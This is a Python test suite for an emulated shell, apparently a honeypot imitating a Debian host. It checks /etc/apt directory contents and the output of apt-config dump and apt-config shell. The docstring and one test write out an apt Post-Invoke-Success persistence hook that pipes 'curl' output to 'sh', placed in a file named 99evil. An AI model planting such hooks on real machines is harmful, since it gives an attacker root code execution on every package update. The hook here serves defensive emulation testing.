"""apt hook persistence: the directory it goes in, and the command that shows it.

Found by searching the suite inventory for persistence mechanisms with no
coverage. /etc/apt/apt.conf.d had none, and it was worse than uncovered:

    $ echo 'APT::Update::Post-Invoke-Success {"curl x|sh";};' \\
          > /etc/apt/apt.conf.d/99evil
    bash: /etc/apt/apt.conf.d/99evil: No such file or directory
    rc=1

The directory did not exist, so the hook could not even be written -- a
hard error on a Debian box where /etc/apt/apt.conf.d is always there. An
apt hook runs as root on every `apt update`, which is why it is a favourite
place to put one.

/etc/apt had two entries, sources.list and sources.list.d. The guest has
ten: apt.conf.d, auth.conf.d, keyrings, listchanges.conf,
listchanges.conf.d, mirrors, preferences.d, sources.list, sources.list.d,
trusted.gpg.d.

`apt-config` was a stock stub that printed its usage -- on a box whose own
/etc/cron.daily/apt-compat runs
`apt-config shell RandomSleep APT::Periodic::RandomSleep`. A script shipped
here called a command shipped here that could not answer it.

Measured on the guest for the shape of `apt-config dump`:

    APT "";                          a parent is an empty-valued node
    APT::Architecture "amd64";
    APT::Build-Essential "";
    APT::Build-Essential:: "build-essential";        list items take "::"
    APT::Periodic "";
    APT::Periodic::Update-Package-Lists "1";         file order, not
    APT::Periodic::Unattended-Upgrade "1";           alphabetical
    DPkg::Pre-Install-Pkgs "";
    DPkg::Pre-Install-Pkgs:: "/usr/bin/apt-listchanges --apt || test $? -lt 10";
    DPkg::Pre-Install-Pkgs:: "/usr/sbin/dpkg-preconfigure --apt || true";

and for the rest of the interface: `apt-config shell VAR Key` prints
VAR='value' and nothing at all for a key that is unset, and an unknown
verb gives "E: Invalid operation X" with rc 100.

The invariant this freezes: a hook written into /etc/apt/apt.conf.d has to
appear in `apt-config dump`. That is the check whoever planted it makes.

Usage:  python3 aptconftest.py
"""

import sys

import fakeshell

CHECKS, FAILS = [], []


def check(name, got, want, note=""):
    ok = got == want
    CHECKS.append(ok)
    if not ok:
        FAILS.append("FAIL %s\n  got  %r\n  want %r%s"
                     % (name, got, want, "\n  -- " + note if note else ""))


def shell():
    fs = fakeshell.VFS()
    return fakeshell.Shell(vfs=fs, peer="198.51.100.15", peer_port=40444)


sh = shell()


def r(cmd):
    try:
        return sh.run(cmd).rstrip("\n")
    except Exception as exc:                                   # noqa: BLE001
        return "<raised %s: %s>" % (type(exc).__name__, exc)


def pos(lines, needle):
    """Index of a line, or -1. index() raises against a tree that has no
    dump at all, and a suite that raises reports a traceback instead of the
    failures it was written to find -- the eighth time that rule has come
    up here."""
    try:
        return lines.index(needle)
    except ValueError:
        return -1


def dump(args=""):
    """The dump as a list of lines, or [] on a build that cannot dump."""
    out = r("apt-config dump %s" % args)
    if not out or "Usage:" in out or "<raised" in out:
        return []
    return out.splitlines()


# ------------------------------------------------------- the directory exists
check("/etc/apt/apt.conf.d is a directory",
      r("test -d /etc/apt/apt.conf.d && echo yes || echo no"), "yes",
      "without it an apt hook cannot be written at all")
for d in ("auth.conf.d", "keyrings", "preferences.d", "trusted.gpg.d",
          "mirrors", "listchanges.conf.d"):
    check("/etc/apt/%s exists" % d,
          r("test -d /etc/apt/%s && echo yes || echo no" % d), "yes")
check("/etc/apt has a real number of entries",
      len(r("ls /etc/apt").split()) >= 9, True,
      "the guest has ten; we had two. got %r" % r("ls /etc/apt").split())

# ------------------------------------------- and Debian's own files are in it
files = r("ls /etc/apt/apt.conf.d").split()
for f in ("01autoremove", "20auto-upgrades", "20listchanges",
          "50unattended-upgrades", "70debconf"):
    check("apt.conf.d ships %s" % f, f in files, True, "got %r" % files)

# ----------------------------------------------------- apt-config can dump
d = dump()
check("apt-config dump produces a dump", len(d) > 20, True,
      "it was a stock stub printing its usage; got %d lines" % len(d))
check("every line is KEY \"value\";",
      all(l.endswith('";') and ' "' in l for l in d), True,
      "got %r" % d[:3])
check("no line is duplicated", len(d), len(set(d)))
check("a parent is an empty-valued node", 'APT "";' in d, True)
check("the architecture is there", 'APT::Architecture "amd64";' in d, True)

# --------------------------------------------- conf.d is actually being read
check("APT::Periodic comes from 20auto-upgrades",
      'APT::Periodic::Update-Package-Lists "1";' in d, True,
      "if this is missing, the dump is a constant and not a read")
check("...and its sibling", 'APT::Periodic::Unattended-Upgrade "1";' in d,
      True)
a_i = pos(d, 'APT::Periodic::Update-Package-Lists "1";')
b_i = pos(d, 'APT::Periodic::Unattended-Upgrade "1";')
check("...in the file's order, not alphabetical",
      a_i >= 0 and b_i >= 0 and a_i < b_i, True,
      "the guest prints Update-Package-Lists first because the file does")
check("a nested block flattens onto ::",
      'APT::NeverAutoRemove:: "^linux-firmware$";' in d, True,
      "01autoremove nests NeverAutoRemove inside APT")
g_i = pos(d, 'APT::NeverAutoRemove "";')
l_i = pos(d, 'APT::NeverAutoRemove:: "^linux-firmware$";')
check("the group node precedes its list",
      g_i >= 0 and l_i >= 0 and g_i < l_i, True)
check("two files can contribute to one list",
      len([l for l in d if l.startswith("DPkg::Pre-Install-Pkgs::")]), 2,
      "20listchanges and 70debconf each add one")
check("...and // comments are not parsed as config",
      any("Pre-configure all packages" in l for l in d), False,
      "70debconf's comment must not become a key")

# ----------------------------------------------- the hook an attacker plants
hook = 'APT::Update::Post-Invoke-Success {"curl http://x/s|sh";};'
check("a hook can be written at all",
      r("echo '%s' > /etc/apt/apt.conf.d/99evil; echo rc=$?" % hook),
      "rc=0", "this failed with ENOENT before the directory existed")
d2 = dump()
check("the hook appears in the dump",
      'APT::Update::Post-Invoke-Success:: "curl http://x/s|sh";' in d2, True,
      "this is the check whoever planted it makes; got %r"
      % [l for l in d2 if "Post-Invoke" in l])
check("...with its group nodes",
      'APT::Update "";' in d2, True)
check("...and a filtered dump finds it",
      any("Post-Invoke" in l for l in dump("APT::Update")), True)
check("an unrelated filter does not",
      any("Post-Invoke" in l for l in dump("Dir")), False)

# --------------------------------------------- the shell form scripts use
check("shell prints VAR='value'",
      r("apt-config shell U APT::Periodic::Unattended-Upgrade"), "U='1'",
      "/etc/cron.daily/apt-compat evals this")
check("...and nothing for a key that is unset",
      r("apt-config shell RandomSleep APT::Periodic::RandomSleep"), "",
      "apt-compat relies on that: it presets RandomSleep=1800 and evals")

# ------------------------------------------------------------- and the errors
check("an unknown verb is rejected",
      r("apt-config nosuchverb 2>&1 | head -1"),
      "E: Invalid operation nosuchverb")
check("...with apt's own status", r("apt-config nosuchverb >/dev/null 2>&1;"
                                    " echo $?"), "100")

# ------------------------------- a file apt would skip must not be parsed
r("echo 'APT::Ignored::Key \"1\";' > /etc/apt/apt.conf.d/99skip.dpkg-old")
check("apt.conf.d entries with ignored suffixes are skipped",
      any("Ignored" in l for l in dump()), False,
      "apt ignores .dpkg-old and friends, so we must too")

for f in FAILS:
    print(" ", f)
print("   aptconf: %d checks, %d differ" % (len(CHECKS), len(FAILS)))
sys.exit(1 if FAILS else 0)
